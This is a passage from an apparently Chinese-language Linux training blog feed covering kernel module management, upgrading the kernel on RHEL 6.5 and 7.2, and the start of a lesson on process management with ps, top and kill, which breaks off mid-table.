<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64</span><br><span class="line">build</span><br><span class="line">modules.dep</span><br><span class="line">modules.networking modules.usbmap</span><br><span class="line">extra</span><br><span class="line">modules.dep.bin</span><br><span class="line">modules.ofmap</span><br><span class="line">source</span><br><span class="line">kernel</span><br><span class="line">modules.drm</span><br><span class="line">modules.order</span><br><span class="line">updates</span><br><span class="line">modules.alias</span><br><span class="line">modules.ieee1394map modules.pcimap</span><br><span class="line">vdso</span><br><span class="line">modules.alias.bin modules.inputmap modules.seriomap weak-updates</span><br><span class="line">modules.block</span><br><span class="line">modules.isapnpmap modules.symbols</span><br><span class="line">modules.ccwmap modules.modesetting modules.symbols.bin</span><br><span class="line">[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/</span><br><span class="line">arch crypto drivers fs kernel lib mm net sound</span><br><span class="line">[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/</span><br><span class="line">acpi</span><br><span class="line">cpufreq hid</span><br><span class="line">leds</span><br><span class="line">net</span><br><span class="line">rtc</span><br><span class="line">vhost</span><br><span class="line">ata</span><br><span class="line">crypto hv</span><br><span class="line">md</span><br><span class="line">parport scsi video</span><br><span class="line">atm</span><br><span class="line">dca</span><br><span class="line">hwmon</span><br><span class="line">media pci</span><br><span class="line">serial virtio</span><br><span class="line">auxdisplay dma</span><br><span class="line">i2c</span><br><span class="line">memstick pcmcia ssb</span><br><span class="line">watchdog</span><br><span class="line">bcma</span><br><span class="line">edac idle</span><br><span class="line">message platform staging xen</span><br><span class="line">block</span><br><span class="line">firewire ieee802154 mfd</span><br><span class="line">power</span><br><span class="line">target</span><br><span class="line">bluetooth firmware infiniband misc</span><br><span class="line">pps</span><br><span class="line">uio</span><br><span class="line">cdrom</span><br><span class="line">gpio</span><br><span class="line">input</span><br><span class="line">mmc</span><br><span class="line">ptp</span><br><span class="line">usb</span><br><span class="line">char</span><br><span class="line">gpu</span><br><span class="line">isdn</span><br><span class="line">mtd</span><br><span class="line">regulator uwb</span><br><span class="line">[root@rhel6 ~]# ls /lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/net</span><br><span class="line">3c59x.ko dl2k.ko</span><br><span class="line">macvtap.ko</span><br><span class="line">pppox.ko</span><br><span class="line">sunhme.ko</span><br><span class="line">8139cp.ko dnet.ko</span><br><span class="line">mdio.ko</span><br><span class="line">ppp_synctty.ko tehuti.ko</span><br></pre></td></tr></table></figure>

<p>/lib/modules/2.6.32-431.el6.x86_64/kernel/ 该目录下的文件解释</p>
<ul>
<li>arch    与硬件平台有关的项目 , 例如 CPU 的等级等等 ;</li>
<li>crypto 内核所支持的加密的技术 , 例如 md5 、 des 等等 ;</li>
<li>drivers 硬件的驱动程序 , 例如显示适配器、网络卡、 PCI 相关硬件</li>
<li>fs 内核所支持的 filesystems , 例如 ext4, vfat, reiserfs, nfs 等等 ;</li>
<li>kernel 内核的程序、内核状态、线程、程序的排程 (schedule) 、程序的 signle 等</li>
<li>lib 函式库</li>
<li>mm 内存单元有关的各项数据</li>
<li>net 与网络有关的各项协议数据,还有防火墙模块</li>
<li>sound 音效有关的各项模块2 内核模块的相依性: depmod</li>
</ul>
<h3 id="moudules-dep-文件"><a href="#moudules-dep-文件" class="headerlink" title="moudules.dep 文件"></a>moudules.dep 文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 etc]# head /lib/modules/$(uname -r)/modules.dep</span><br><span class="line">kernel/arch/x86/kernel/cpu/mcheck/mce-inject.ko:</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/powernow-k8.ko: kernel/drivers/cpufreq/freq_table.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/mperf.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/mperf.ko:</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/acpi-cpufreq.ko: kernel/drivers/cpufreq/freq_table.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/mperf.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/pcc-cpufreq.ko:</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/speedstep-lib.ko:</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/p4-clockmod.ko: kernel/drivers/cpufreq/freq_table.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/speedstep-lib.ko</span><br><span class="line">kernel/arch/x86/kernel/cpu/cpufreq/intel_pstate.ko:</span><br><span class="line">kernel/arch/x86/kernel/test_nx.ko:</span><br><span class="line">kernel/arch/x86/kernel/microcode.ko:</span><br></pre></td></tr></table></figure>

<h3 id="depmod-命令"><a href="#depmod-命令" class="headerlink" title="depmod 命令"></a>depmod 命令</h3><p>depmod [-Ane]</p>
<p>选项与参数 :</p>
<ul>
<li>-A : 不加任何参数时 , depmod 会主动的去分析目前内核的模块 , 并且重新写入<code>/lib/modules/$(uname -r)/modules.dep</code> 当中更新。若加入 -A 参数时 , 则 depmod 会去搜寻比 modules.dep 内还要新的模块,若找到新模块则</li>
<li>-n : 不写入 modules.dep , 而是将结果输出到屏幕上 (standard out);</li>
<li>-e : 显示出目前已加载的不可执行的模块名称</li>
</ul>
<h3 id="depmod-实验"><a href="#depmod-实验" class="headerlink" title="depmod 实验"></a>depmod 实验</h3><p>假设已经做好一个网卡驱动程序 , 档名为 a.ko, 请更新内核的相依性。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# cp a.ko /lib/modules/2.6.32-</span><br><span class="line">431.el6.x86_64/kernel/drivers/net</span><br><span class="line">[root@rhel6 ~]# depmod3 内核模块的观察: lsmod, modinfo</span><br></pre></td></tr></table></figure>

<h3 id="lsmod-命令"><a href="#lsmod-命令" class="headerlink" title="lsmod 命令"></a>lsmod 命令</h3><p>作用:显示出目前已经存在于内核当中的模块 , 显示的内容包括 :</p>
<ol>
<li>模块名称 (Module);</li>
<li>模块的大小 (size);</li>
<li>此模块是否被其他模块所使用 (Used by) 。</li>
</ol>
<h3 id="modinfo-命令"><a href="#modinfo-命令" class="headerlink" title="modinfo 命令"></a>modinfo 命令</h3><p>用法:</p>
<p>modinfo [-adln] [module_name|filename]</p>
<p>选项与参数 :</p>
<ul>
<li>-a : 仅列出作者名称 ;</li>
<li>-d : 仅列出该 modules 的说明 (description);</li>
<li>-l : 仅列出授权 (license);</li>
<li>-n : 仅列出该模块的详细路径。</li>
</ul>
<h3 id="内核模块的观察实验"><a href="#内核模块的观察实验" class="headerlink" title="内核模块的观察实验"></a>内核模块的观察实验</h3><p>首先查看目前已存在于内核中的模块,随便选择一个模块并查看该模块的详细信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# [root@rhel6 ~]# lsmod</span><br><span class="line">Module</span><br><span class="line">Size</span><br><span class="line">Used by</span><br><span class="line">autofs4 26513 3</span><br><span class="line">8021q 25349 0</span><br><span class="line">garp</span><br><span class="line">7152</span><br><span class="line">1 8021q</span><br><span class="line">[root@rhel6 ~]# modinfo autofs4</span><br><span class="line">filename:</span><br><span class="line">/lib/modules/2.6.32-</span><br><span class="line">431.el6.x86_64/kernel/fs/autofs4/autofs4.ko</span><br><span class="line">license: GPL</span><br><span class="line">srcversion: 948FC9C8D4043379272927C</span><br><span class="line">depends:</span><br><span class="line">vermagic:</span><br><span class="line">2.6.32-431.el6.x86_64 SMP mod_unload modversions</span><br></pre></td></tr></table></figure>

<h2 id="内核模块的加载与移除-insmod-modprobe-rmmod"><a href="#内核模块的加载与移除-insmod-modprobe-rmmod" class="headerlink" title="内核模块的加载与移除:insmod, modprobe, rmmod"></a>内核模块的加载与移除:insmod, modprobe, rmmod</h2><p>modprobe 加载模块会主动去搜寻 modules.dep 的内容 , 先解决模块的相依性后 , 再决定需要加载的模块有哪些,很方便; insmod 则完全由使用者自行加载一个完整文件名的模块 , 不会主动分析模块相依性</p>
<h3 id="insmod-命令"><a href="#insmod-命令" class="headerlink" title="insmod 命令"></a>insmod 命令</h3><p>insmod [/full/path/module_name] [parameters]</p>
<h3 id="modprobe-命令"><a href="#modprobe-命令" class="headerlink" title="modprobe 命令"></a>modprobe 命令</h3><p>modprobe [-lcfr] module_name</p>
<p>选项与参数 :</p>
<ul>
<li>-c : 列出目前系统所有的模块 !( 更详细的代号对应表 )</li>
<li>-l : 列出目前在 /lib/modules/<code>uname -r</code>/kernel 当中的所有模块完整文件 名 ;</li>
<li>-f : 强制加载该模块 ;</li>
<li>-r : 类似 rmmod , 移除某个模块</li>
</ul>
<h3 id="rmmod-命令"><a href="#rmmod-命令" class="headerlink" title="rmmod 命令"></a>rmmod 命令</h3><p>rmmod [-fw] module_name</p>
<p>选项与参数 :</p>
<ul>
<li>-f : 强制将该模块移除掉 , 不管是否正被使用 ;</li>
<li>-w : 若该模块正被使用 , 则等该模块被使用完毕后 , 再移除</li>
</ul>
<h3 id="内核模块的加载与移除实验"><a href="#内核模块的加载与移除实验" class="headerlink" title="内核模块的加载与移除实验"></a>内核模块的加载与移除实验</h3><p>加载模块;查看该模块是否已成功加载,并查看详细信息;移除该模块。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 net]# modprobe dnet</span><br><span class="line">[root@rhel6 net]# modinfo dnet</span><br><span class="line">filename:</span><br><span class="line">/lib/modules/2.6.32-431.el6.x86_64/kernel/drivers/net/dnet.ko</span><br><span class="line">author:</span><br><span class="line">Ilya Yanok &lt;yanok@emcraft.com&gt;, Matteo Vit &lt;matteo.vit@dave.eu&gt;</span><br><span class="line">description: Dave DNET Ethernet driver</span><br><span class="line">license:</span><br><span class="line">GPL</span><br><span class="line">srcversion: 9D532980E04E93088A9DFC1</span><br><span class="line">depends:</span><br><span class="line">vermagic:</span><br><span class="line">2.6.32-431.el6.x86_64 SMP mod_unload modversions</span><br><span class="line">[root@rhel6 net]# lsmod | grep dnet</span><br><span class="line">dnet</span><br><span class="line">16103 0</span><br><span class="line">[root@rhel6 net]# rmmod dnet</span><br><span class="line">[root@rhel6 net]# lsmod | grep dnet</span><br></pre></td></tr></table></figure>

<h2 id="内核模块的额外参数设定-etc-modprobe-d-conf"><a href="#内核模块的额外参数设定-etc-modprobe-d-conf" class="headerlink" title="内核模块的额外参数设定:/etc/modprobe.d/*.conf"></a>内核模块的额外参数设定:/etc/modprobe.d/*.conf</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# ls /etc/modprobe.d/</span><br><span class="line">anaconda.conf dist-alsa.conf dist-oss.conf</span><br><span class="line">blacklist.conf dist.conf</span><br><span class="line">openfwwf.conf</span><br><span class="line">[root@rhel6 ~]# cat /etc/modprobe.d/dist.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> default modutils aliases</span></span><br><span class="line">alias binfmt-204 binfmt_aout</span><br><span class="line">alias binfmt-263 binfmt_aout</span><br><span class="line">alias binfmt-264 binfmt_aout</span><br><span class="line">alias binfmt-267 binfmt_aout</span><br><span class="line">alias binfmt-387 binfmt_aout</span><br><span class="line">alias block-major-1-* rd</span><br><span class="line">alias block-major-3-* ide-probe-mod</span><br><span class="line">alias block-major-8-* sd_mod</span><br><span class="line">alias block-major-9-* md</span><br><span class="line">alias block-major-11-* sr_mod</span><br><span class="line">alias block-major-13-* xd</span><br><span class="line">alias block-major-15-* cdu31a</span><br><span class="line">alias block-major-16-* gscd</span><br><span class="line">alias block-major-17-* optcd</span><br><span class="line">alias block-major-18-* sjcd</span><br><span class="line">alias block-major-20-* mcdx</span><br><span class="line">alias block-major-22-* ide-probe-mod</span><br><span class="line">alias block-major-23-* mcd</span><br><span class="line">alias block-major-24-* sonycd535</span><br><span class="line">alias block-major-25-* sbpcd</span><br><span class="line">alias block-major-26-* sbpcd</span><br><span class="line">alias block-major-27-* sbpcd</span><br><span class="line">alias block-major-29-* aztcd</span><br><span class="line">alias block-major-32-* cm206</span><br><span class="line">alias block-major-33-* ide-probe-mod</span><br><span class="line">alias block-major-34-* ide-probe-mod</span><br><span class="line">alias block-major-37-* ide-tape</span><br><span class="line">alias block-major-44-* ftl</span><br><span class="line">alias block-major-46-* pcd</span><br><span class="line">alias block-major-47-* pf</span><br></pre></td></tr></table></figure>

<h2 id="内核升级"><a href="#内核升级" class="headerlink" title="内核升级"></a>内核升级</h2><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>Linux 内核官网 <a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/</a> 提供的是源码,需要编译使用。</p>
<p><img src="pic/44.png" alt="44"></p>
<p>Linux 内核版本有两种 : 稳定版和开发版 ,Linux 内核版本号由 3 个数字组成 :r.x.y</p>
<ul>
<li>r: 主版本号</li>
<li>x: 次版本号 , 偶数表示稳定版本 ; 奇数表示开发中版本。</li>
<li>y: 修订版本号 , 表示修改的次数</li>
</ul>
<p>去 <a href="http://www.kernel.org" target="_blank" rel="noopener">http://www.kernel.org</a> 首页 , 可以看到有 stable, longterm 等版本 ,longterm 是比stable 更稳定的版本 , 会长时间更新。</p>
<p>源码编译不做要求。</p>
<h3 id="rpm-包安装"><a href="#rpm-包安装" class="headerlink" title="rpm 包安装"></a>rpm 包安装</h3><p>在工作中应该去操作系统的发行公司的官网下载已经编译好的内核。我们使用的是红帽的,那么就去红帽的官网 <a href="https://www.redhat.com/en/global/china" target="_blank" rel="noopener">https://www.redhat.com/en/global/china</a></p>
<p>这里使用一个免费的源 ELRepo 源</p>
<p><img src="pic/45.png" alt="45"></p>
<h4 id="rhel6-5-内核升级-——-yum-方式-有网"><a href="#rhel6-5-内核升级-——-yum-方式-有网" class="headerlink" title="rhel6.5 内核升级 —— yum 方式(有网)"></a>rhel6.5 内核升级 —— yum 方式(有网)</h4><p>在 yum 的 ELRepo 源中 , 选择 kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm 这个版<br>本。</p>
<p><img src="pic/46.png" alt="46"></p>
<p>重新启动后的 grub 界面</p>
<p><img src="pic/47.png" alt="47"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">1<span class="comment">#root@rhel6 ~]#uname -r</span></span></span><br><span class="line">3.10.102-1.el6.elrepo.x86_64</span><br></pre></td></tr></table></figure>

<h4 id="rhel7-2-内核升级-——-本地-rpm-安装-没网"><a href="#rhel7-2-内核升级-——-本地-rpm-安装-没网" class="headerlink" title="rhel7.2 内核升级 —— 本地 rpm 安装(没网)"></a>rhel7.2 内核升级 —— 本地 rpm 安装(没网)</h4><p>此处是在 <a href="http://rpm.pbone.net" target="_blank" rel="noopener">http://rpm.pbone.net</a> 上下载的,实际工作中应该到红帽官网下载。</p>
<p><img src="pic/48.png" alt="48"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# ls</span><br><span class="line">anaconda-ks.cfg Downloads</span><br><span class="line">Music Templates</span><br><span class="line">Desktop</span><br><span class="line">initial-setup-ks.cfg</span><br><span class="line">Pictures Videos</span><br><span class="line">Documents</span><br><span class="line">kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm Public</span><br></pre></td></tr></table></figure>
<p>查看但前系统内核版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# uname -r</span><br><span class="line">3.10.0-123.el7.x86_64</span><br></pre></td></tr></table></figure>

<p>安装新内核并保留原内核</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# rpm -ivh kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm</span><br><span class="line">Preparing...</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">################################ [100%]</span></span></span><br><span class="line">Updating / installing...</span><br><span class="line">1:kernel-lt-3.10.102-1.el6.elrepo ################################# [100%]</span><br><span class="line">[root@rhel7 ~]# cd /boot/grub2/</span><br><span class="line">[root@rhel7 grub2]# ll /etc/grub2.cfg</span><br><span class="line">lrwxrwxrwx. 1 root root 22 Jul 2 2015 /etc/grub2.cfg -&gt; ../boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure>

<p>查看当前默认启动内核</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# grub2-editenv list</span><br><span class="line">saved_entry=Red Hat Enterprise Linux Linux, with Linux 3.10.0-123.el7.x86_64</span><br></pre></td></tr></table></figure>

<p>查看配置文件中有几个启动项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# grep "menuentry" /boot/grub2/grub.cfg</span><br><span class="line">if [ x"$&#123;feature_menuentry_id&#125;" = xy ]; then</span><br><span class="line">menuentry_id_option="--id"</span><br><span class="line">menuentry_id_option=""</span><br><span class="line">export menuentry_id_option</span><br><span class="line">menuentry 'Red Hat Enterprise Linux Server (3.10.102-1.el6.elrepo.x86_64) 7.0 (Maipo)' --class red</span><br><span class="line">--class gnu-linux --class gnu --class os --unrestricted $menuentry_id_option 'gnulinux-3.10.0-</span><br><span class="line">123.el7.x86_64-advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e' &#123;</span><br><span class="line">menuentry 'Red Hat Enterprise Linux Server, with Linux 3.10.0-123.el7.x86_64' --class red --class</span><br><span class="line">gnu-linux --class gnu --class os --unrestricted $menuentry_id_option 'gnulinux-3.10.0-</span><br><span class="line">123.el7.x86_64-advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e' &#123;</span><br><span class="line">menuentry 'Red Hat Enterprise Linux Server, with Linux 0-rescue-14d17f362db9498eaa56aac326570c37' --class red --class gnu-linux --class gnu --class os</span><br><span class="line">--unrestricted $menuentry_id_option 'gnulinux-0-rescue-14d17f362db9498eaa56aac326570c37-</span><br><span class="line">advanced-5220f38d-edd6-45e5-a257-f1e9e6c80b4e' &#123;</span><br></pre></td></tr></table></figure>

<p>设置默认启动内核</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# grub2-set-default 'Red Hat Enterprise Linux Server (3.10.102-</span><br><span class="line">1.el6.elrepo.x86_64) 7.0 (Maipo)'</span><br></pre></td></tr></table></figure>

<p>查看当前默认启动内核</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# grub2-editenv list</span><br><span class="line">saved_entry=Red Hat Enterprise Linux Server (3.10.102-1.el6.elrepo.x86_64) 7.0 (Maipo)</span><br></pre></td></tr></table></figure>

<p>更新一下配置 , 让新的内核启动生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# grub2-mkconfig -o /boot/grub2/grub.cfg</span><br><span class="line">Generating grub configuration file ...</span><br><span class="line">Found linux image: /boot/vmlinuz-3.10.102-1.el6.elrepo.x86_64</span><br><span class="line">Found initrd image: /boot/initramfs-3.10.102-1.el6.elrepo.x86_64.img</span><br><span class="line">Found linux image: /boot/vmlinuz-3.10.0-123.el7.x86_64</span><br><span class="line">Found initrd image: /boot/initramfs-3.10.0-123.el7.x86_64.img</span><br><span class="line">Found linux image: /boot/vmlinuz-0-rescue-14d17f362db9498eaa56aac326570c37</span><br><span class="line">Found initrd image: /boot/initramfs-0-rescue-14d17f362db9498eaa56aac326570c37.img</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>重新启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 grub2]# reboot</span><br></pre></td></tr></table></figure>

<p>查看当前内核版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# uname -r</span><br><span class="line">3.10.102-1.el6.elrepo.x86_64</span><br></pre></td></tr></table></figure>

<h2 id="Linux-内核作业"><a href="#Linux-内核作业" class="headerlink" title="Linux 内核作业"></a>Linux 内核作业</h2><ol>
<li>到共享当中下载 linux 内核 kernel-lt-3.10.102-1.el6.elrepo.x86_64.rpm</li>
<li>rhel6.5 进行内核升级,保留原内核</li>
<li>rhel7.2 进行内核升级,保留原内核</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 进程管理</title>
    <url>/2016/12/22/booboo_linux_base/13-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><ul>
<li><p>进程： 运行在内存中程序实例 , 进程是程序运行的一种状态 , 是内存中的概念，进程与进程之间无法访问对方私有的内存区域。</p>
</li>
<li><p>线程： 程序运行的最小单元，一个进程可以派生出多个线程，同一个进程内的线程之间可以相互访问彼此内存区域，并且可以共享同一进程的共享内存区域。</p>
</li>
<li><p>进程编号：pid</p>
</li>
<li><p>父进程编号：ppid</p>
</li>
</ul>
<h3 id="pstree-命令"><a href="#pstree-命令" class="headerlink" title="pstree 命令"></a>pstree 命令</h3><p>pstree 命令用以查看进程的结构</p>
<table>
<thead>
<tr>
<th>常用参数</th>
<th>参数说明</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>显示每个程序的完整指令，包含路径，参数或是常驻服务的标示。</td>
</tr>
<tr>
<td>-c</td>
<td>不使用精简标示法。</td>
</tr>
<tr>
<td>-G</td>
<td>使用VT100终端机的列绘图字符。</td>
</tr>
<tr>
<td>-h</td>
<td>列出树状图时，特别标明执行的程序。</td>
</tr>
<tr>
<td>-H&lt;程序识别码&gt;</td>
<td>此参数的效果和指定”-h”参数类似，但特别标明指定的程序。</td>
</tr>
<tr>
<td>-l</td>
<td>采用长列格式显示树状图。</td>
</tr>
<tr>
<td>-n</td>
<td>用程序识别码排序。预设是以程序名称来排序。</td>
</tr>
<tr>
<td>-p</td>
<td>显示程序识别码。</td>
</tr>
<tr>
<td>-u</td>
<td>显示用户名称。</td>
</tr>
<tr>
<td>-U</td>
<td>使用UTF-8列绘图字符。</td>
</tr>
<tr>
<td>-V</td>
<td>显示版本信息。</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 /etc/skel]#pstree</span><br><span class="line">init─┬─NetworkManager─┬─dhclient</span><br><span class="line">│</span><br><span class="line">└─&#123;NetworkManager&#125;</span><br><span class="line">├─abrtd</span><br><span class="line">├─acpid</span><br><span class="line">├─anacron</span><br><span class="line">├─atd</span><br><span class="line">├─auditd───&#123;auditd&#125;</span><br><span class="line">├─automount───4*[&#123;automount&#125;]</span><br><span class="line">├─bonobo-activati───&#123;bonobo-activat&#125;</span><br><span class="line">├─certmonger</span><br><span class="line">├─console-kit-dae───63*[&#123;console-kit-da&#125;]</span><br><span class="line">├─crond</span><br><span class="line">├─cupsd</span><br><span class="line">├─2*[dbus-daemon───&#123;dbus-daemon&#125;]</span><br><span class="line">├─dbus-launch</span><br><span class="line">├─devkit-power-da</span><br><span class="line">├─gconfd-2</span><br><span class="line">├─gdm-binary─┬─gdm-simple-slav─┬─Xorg</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─gdm-session-wor</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─gnome-session─┬─at-spi-registry</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─gdm-simple-gree</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─gnome-power-man</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─metacity</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">├─polkit-gnome-au</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">└─&#123;gnome-session&#125;</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">└─&#123;gdm-simple-sla&#125;</span><br><span class="line">│</span><br><span class="line">└─&#123;gdm-binary&#125;</span><br><span class="line">├─gnome-settings-───&#123;gnome-settings&#125;</span><br><span class="line">├─gvfsd</span><br><span class="line">├─hald─┬─hald-runner─┬─hald-addon-acpi</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">└─hald-addon-inpu</span><br><span class="line">│</span><br><span class="line">└─&#123;hald&#125;</span><br><span class="line">├─master─┬─pickup│</span><br><span class="line">└─qmgr</span><br><span class="line">├─5*[mingetty]</span><br><span class="line">├─modem-manager</span><br><span class="line">├─polkitd</span><br><span class="line">├─pulseaudio───&#123;pulseaudio&#125;</span><br><span class="line">├─rhsmcertd</span><br><span class="line">├─rpc.statd</span><br><span class="line">├─rpcbind</span><br><span class="line">├─rsyslogd───3*[&#123;rsyslogd&#125;]</span><br><span class="line">├─rtkit-daemon───2*[&#123;rtkit-daemon&#125;]</span><br><span class="line">├─sshd───sshd───bash───pstree</span><br><span class="line">├─udevd───2*[udevd]</span><br><span class="line">└─wpa_supplicant</span><br></pre></td></tr></table></figure>

<h3 id="静态查看进程信息"><a href="#静态查看进程信息" class="headerlink" title="静态查看进程信息"></a>静态查看进程信息</h3><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><ul>
<li>ps 查看当前标签页上的进程信息</li>
<li>ps aux 系统进程快照 </li>
<li>ps -ef e 所有进程 f 全格式罗列</li>
</ul>
<p>使用ps aux查看<br>第一列user代表进程的拥有者，第二列PID，第三列占用CPU的百分比，第四列占用内存的百分比，我们说进程占用系统资源，像CPU内存都属于系统资源的一部分，这里都将它显示出来了。接下来，VSZ代表这个占用虚拟内存的大小，RSS代表占用物理内存的大小，以KB为单位。虚拟空间就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用，那么物理内存就是真实存在的真正的内存大小。然后就是处于哪个终端，进程目前的状态，开始时间，和具体的命令。那么进程的状态有哪些呢。<br>S：休眠状态（sleeping）<br>R：等待运行（runable）R Running or runnable (on run queue) 进程处于运行或就绪状态<br>I：空闲状态（idle）<br>&lt;    high-priority (not nice to other users) 优先级较高的<br>N    low-priority (nice to other users)     优先级较低<br>s    is a session leader                 进程的领导者<br>l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads do) 多线程</p>
<ul>
<li>is in the foreground process group   在前台进程组</li>
</ul>
<p>使用ps -ef 查看<br>UID 用户ID<br>PID 进程ID<br>PPID 父进程ID<br>C CPU占用率<br>STIME 开始时间<br>TTY 开始此进程的TTY<br>TIME 此进程运行的总时间<br>CMD 命令名</p>
<p>使用ps -le可以用来查看这个进程的优先级，主要关注优先级，优先级是NI这一列，其他先不用关注</p>
<h4 id="pgrep"><a href="#pgrep" class="headerlink" title="pgrep"></a>pgrep</h4><p>用来过滤进程号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# pgrep -l ping &lt;== 截取进程号 pid</span><br><span class="line">27706 ping</span><br><span class="line">[root@rhel6 ~]# pgrep -lU student &lt;== 指定用户截取进程号 pid</span><br><span class="line">27736 bash</span><br><span class="line">27762 ping</span><br><span class="line">[root@rhel6 ~]# pgrep -l -t pts/1 &lt;== 指定登陆端口截取进程号 pid</span><br><span class="line">2568 bash</span><br><span class="line">27735 su</span><br><span class="line">27736 bash</span><br><span class="line">1.2.3 pidof</span><br><span class="line">[root@rhel6 ~]# pidof Xorg &lt;== 只显示进程的进程号 pid</span><br><span class="line">15262</span><br></pre></td></tr></table></figure>

<h2 id="动态查看进程信息"><a href="#动态查看进程信息" class="headerlink" title="动态查看进程信息"></a>动态查看进程信息</h2><h3 id="top-终端提示符不显示"><a href="#top-终端提示符不显示" class="headerlink" title="top 终端提示符不显示"></a>top 终端提示符不显示</h3><ul>
<li>【 d 】修改默认刷新频率 , 默认 3s</li>
<li>【 P 】以 cup 占用百分比进行排序</li>
<li>【 M 】以内存的占用情况排序</li>
<li>【 h 】显示帮助信息</li>
<li>【 &lt;&gt; 】翻页</li>
<li>【 k 】杀掉进程 kill</li>
</ul>
<p>top命令图解</p>
<p> <img src="pic%5Ctop-pic.png" alt="top-pic"></p>
<h3 id="停止进程"><a href="#停止进程" class="headerlink" title="停止进程"></a>停止进程</h3><p>Linux中的 kill 命令用来停止指定的进程( terminate a process )的运行，是 Linux下进程管理的常用命令。</p>
<p>通常情况下停止一个前台进程可以使用 Ctrl+C 组合键，但是对于一个运行在后台进程需要用 kill命令来终止，我们就需要先使用 ps、pidof、pstree和top 等工具获取进程 PID ，然后使用 kill 命令来杀掉该进程。</p>
<p>kill 命令是通过向进程发送指定的信号来结束相应进程的。在默认情况下,采用编号为15 的 TERM 信号。 TERM 信号将终止所有不能捕获该信号的进程。</p>
<p>对于那些可以捕获该信号的进程就要用编号为 9 的 kill 信号,强行 “ 杀掉 ” 该进程。</p>
<p>命令格式</p>
<p>kill [参数][进程号]</p>
<p>命令功能：</p>
<p>发送指定的信号到相应进程。不指定型号将发送 SIGTERM ( 15 )终止指定进程。如果任无法终止该程序可用 “ -KILL” 参数，其发送的信号为 SIGKILL(9) ，将强制结束进程,使用 ps 命令或者 jobs 命令可以查看进程号。 root 用户将影响用户的进程,非 root 用户只能影响自己的进程。</p>
<p>命令参数：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-l</td>
<td align="left">信号,若果不加信号的编号参数,则使用 “ -l” 参数会列出全部的信号名称</td>
</tr>
<tr>
<td align="left">-a</td>
<td align="left">当处理当前进程时,不限制命令名和进程号的对应关系</td>
</tr>
<tr>
<td align="left">-p</td>
